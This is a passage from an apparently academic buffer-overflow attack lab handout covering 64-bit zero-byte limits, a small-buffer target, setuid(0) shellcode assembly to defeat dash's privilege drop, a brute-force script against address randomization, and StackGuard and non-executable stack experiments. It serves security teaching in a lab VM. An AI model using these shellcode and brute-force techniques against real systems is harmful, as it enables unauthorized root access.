only the address from <code class="docutils literal notranslate"><span class="pre">0x00</span></code> through <code class="docutils literal notranslate"><span class="pre">0x00007FFFFFFFFFFF</span></code> is
allowed. That means for every address (8 bytes), the highest two bytes
are always zeros. This causes a problem.</p>
<p>In our buffer-overflow attacks, we need to store at least one address in
the payload, and the payload will be copied into the stack via
<code class="docutils literal notranslate"><span class="pre">strcpy()</span></code>. We know that the <code class="docutils literal notranslate"><span class="pre">strcpy()</span></code> function will stop copying
when it sees a zero. Therefore, if zero appears in the middle of the
payload, the content after the zero cannot be copied into the stack. How
to solve this problem is the most difficult challenge in this attack.</p>
</div>
<div class="section" id="task-6-launching-attack-on-64-bit-program-level-4">
<h2>Task 6: Launching Attack on 64-bit Program (Level 4)<a class="headerlink" href="#task-6-launching-attack-on-64-bit-program-level-4" title="Permalink to this headline">¶</a></h2>
<p>The target program (<code class="docutils literal notranslate"><span class="pre">stack-L4</span></code>) in this task is similar to the one in
the Level 2, except that the buffer size is extremely small. We set the
buffer size to 10, while in Level 2, the buffer size is much larger.
Your goal is the same: get the root shell by attacking this program. You
may encounter additional challenges in this attack due to the small
buffer size. If that is the case, you need to explain how your have
solved those challenges in your attack.</p>
</div>
<div class="section" id="tasks-7-defeating-dashs-countermeasure">
<h2>Tasks 7: Defeating <code class="docutils literal notranslate"><span class="pre">dash</span></code>’s Countermeasure<a class="headerlink" href="#tasks-7-defeating-dashs-countermeasure" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">dash</span></code> shell in the Ubuntu OS drops privileges when it detects
that the effective UID does not equal to the real UID (which is the case
in a program). This is achieved by changing the effective UID back to
the real UID, essentially, dropping the privilege. In the previous
tasks, we let <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> points to another shell called <code class="docutils literal notranslate"><span class="pre">zsh</span></code>, which
does not have such a countermeasure. In this task, we will change it
back, and see how we can defeat the countermeasure. Please do the
following, so <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> points back to <code class="docutils literal notranslate"><span class="pre">/bin/dash</span></code>.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo ln -sf /bin/dash /bin/sh
</pre></div>
</div>
<p>To defeat the countermeasure in buffer-overflow attacks, all we need to
do is to change the real UID, so it equals the effective UID. When a
root-owned program runs, the effective UID is zero, so before we invoke
the shell program, we just need to change the real UID to zero. We can
achieve this by invoking <code class="docutils literal notranslate"><span class="pre">setuid(0)</span></code> before executing <code class="docutils literal notranslate"><span class="pre">execve()</span></code> in
the shellcode.</p>
<p>The following assembly code shows how to invoke <code class="docutils literal notranslate"><span class="pre">setuid(0)</span></code>. The
binary code is already put inside <code class="docutils literal notranslate"><span class="pre">call_shellcode.c</span></code>. You just need to
add it to the beginning of the shellcode.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>; Invoke setuid(0): 32-bit
xor ebx, ebx      ; ebx = 0: setuid()&#39;s argument
xor eax, eax
mov  al, 0xd5     ; setuid()&#39;s system call number
int 0x80

; Invoke setuid(0): 64-bit
xor rdi, rdi      ; rdi = 0: setuid()&#39;s argument
xor rax, rax
mov  al, 0x69     ; setuid()&#39;s system call number
syscall
</pre></div>
</div>
<p><strong>Experiment.</strong> Compile <code class="docutils literal notranslate"><span class="pre">call_shellcode.c</span></code> into root-owned binary (by typing
<code class="docutils literal notranslate"><span class="pre">&quot;make</span> <span class="pre">setuid&quot;</span></code>). Run the shellcode <code class="docutils literal notranslate"><span class="pre">a32.out</span></code> and <code class="docutils literal notranslate"><span class="pre">a64.out</span></code> with
or without the <code class="docutils literal notranslate"><span class="pre">setuid(0)</span></code> system call. Please describe and explain
your observations.</p>
<p><strong>Launching the attack again.</strong> Now, using the updated shellcode, we can attempt the attack again on the
vulnerable program, and this time, with the shell’s countermeasure
turned on. Repeat your attack on Level 1, and see whether you can get
the root shell. After getting the root shell, please run the following
command to prove that the countermeasure is turned on. Although
repeating the attacks on Levels 2 and 3 are not required, feel free to
do that and see whether they work or not.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># ls -l /bin/sh /bin/zsh /bin/dash
</pre></div>
</div>
</div>
<div class="section" id="task-8-defeating-address-randomization">
<h2>Task 8: Defeating Address Randomization<a class="headerlink" href="#task-8-defeating-address-randomization" title="Permalink to this headline">¶</a></h2>
<p>On 32-bit Linux machines, stacks only have 19 bits of entropy, which
means the stack base address can have <span class="math notranslate nohighlight">\(2^{19} = 524,288\)</span>
possibilities. This number is not that high and can be exhausted easily
with the brute-force approach. In this task, we use such an approach to
defeat the address randomization countermeasure on our 32-bit VM. First,
we turn on the Ubuntu’s address randomization using the following
command. Then we run the same attack against <code class="docutils literal notranslate"><span class="pre">stack-L1</span></code>. Please
describe and explain your observation.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
</pre></div>
</div>
<p>We then use the brute-force approach to attack the vulnerable program
repeatedly, hoping that the address we put in the <code class="docutils literal notranslate"><span class="pre">badfile</span></code> can
eventually be correct. We will only try this on <code class="docutils literal notranslate"><span class="pre">stack-L1</span></code>, which is a
32-bit program. You can use the following shell script to run the
vulnerable program in an infinite loop. If your attack succeeds, the
script will stop; otherwise, it will keep running. Please be patient, as
this may take a few minutes, but if you are very unlucky, it may take
longer. Please describe your observation.</p>
<div class="code bash highlight-none notranslate"><div class="highlight"><pre><span></span>#!/bin/bash

SECONDS=0
value=0

while true; do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo &quot;$min minutes and $sec seconds elapsed.&quot;
  echo &quot;The program has been running $value times so far.&quot;
  ./stack-L1
done
</pre></div>
</div>
<p>Brute-force attacks on 64-bit programs is much harder, because the
entropy is much larger. Although this is not required, free free to try
it just for fun. Let it run overnight. Who knows, you may be very lucky.</p>
</div>
<div class="section" id="tasks-9-experimenting-with-other-countermeasures">
<h2>Tasks 9: Experimenting with Other Countermeasures<a class="headerlink" href="#tasks-9-experimenting-with-other-countermeasures" title="Permalink to this headline">¶</a></h2>
<div class="section" id="task-9-a-turn-on-the-stackguard-protection">
<h3>Task 9.a: Turn on the StackGuard Protection<a class="headerlink" href="#task-9-a-turn-on-the-stackguard-protection" title="Permalink to this headline">¶</a></h3>
<p>Many compiler, such as <code class="docutils literal notranslate"><span class="pre">gcc</span></code>, implements a security mechanism called
<em>StackGuard</em> to prevent buffer overflows. In the presence of this
protection, buffer overflow attacks will not work. In our previous
tasks, we disabled the StackGuard protection mechanism when compiling
the programs. In this task, we will turn it on and see what will happen.</p>
<p>First, repeat the Level-1 attack with the StackGuard off, and make sure
that the attack is still successful. Remember to turn off the address
randomization, because you have turned it on in the previous task. Then,
we turn on the StackGuard protection by recompiling the vulnerable
<code class="docutils literal notranslate"><span class="pre">stack.c</span></code> program without the <code class="docutils literal notranslate"><span class="pre">-fno-stack-protector</span></code> flag. In
<code class="docutils literal notranslate"><span class="pre">gcc</span></code> version 4.3.3 and above, StackGuard is enabled by default.
Launch the attack; report and explain your observations.</p>
</div>
<div class="section" id="task-9-b-turn-on-the-non-executable-stack-protection">
<h3>Task 9.b: Turn on the Non-executable Stack Protection<a class="headerlink" href="#task-9-b-turn-on-the-non-executable-stack-protection" title="Permalink to this headline">¶</a></h3>
<p>Operating systems used to allow executable stacks, but this has now changed: In Ubuntu OS, the binary
images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e.,
they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide
whether to make the stack of this running program executable or non-executable. This marking is done
automatically by the <code class="docutils literal notranslate"><span class="pre">gcc</span></code>, which by default makes stack non-executable. We can specifically make it nonexecutable using the “-z noexecstack” flag in the compilation. In our previous tasks, we used “-z
execstack” to make stacks executable.</p>
<p>In this task, we will make the stack non-executable. We will do this experiment in the <code class="docutils literal notranslate"><span class="pre">shellcode</span></code>
folder. The <code class="docutils literal notranslate"><span class="pre">call_shellcode</span></code> program puts a copy of shellcode on the stack, and then executes the code
from the stack. Please recompile <code class="docutils literal notranslate"><span class="pre">call_shellcode.c</span></code> into <code class="docutils literal notranslate"><span class="pre">a32.out</span></code> and <code class="docutils literal notranslate"><span class="pre">a64.out</span></code>, without the “-z
execstack” option. Run them, describe and explain your observations</p>
<p><strong>Defeating the non-executable stack countermeasure.</strong> It should be noted that non-executable stack only
makes it impossible to run shellcode on the stack, but it does not prevent buffer-overflow attacks, because
there are other ways to run malicious code after exploiting a buffer-overflow vulnerability. The return-tolibc attack is an example. We have designed a separate lab for that attack. If you are interested, please see
our Return-to-Libc Attack Lab for details.</p>
</div>
</div>
<div class="section" id="submission">
<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
have observed. You also need to provide explanation to the observations that are interesting or surprising.
Please also list the important code snippets followed by explanation. Simply attaching code without any
explanation will not receive credits.</p>
</div>
</div>


           </div>
           
          </div>
          <footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
        <a href="Buffer_Overflow_Server.html" class="btn btn-neutral float-right" title="Buffer Overflow Attack Lab (Server Version)" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
        <a href="Shellcode.html" class="btn btn-neutral float-left" title="Shellcode Development Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>
        &#169; Copyright 2021, NEXUS Lab.

    </p>
  </div>
    
    
    
    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    
    provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>
        </div>
      </div>

    </section>

  </div>
  

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script>

  
  
    
   

</body>
</html>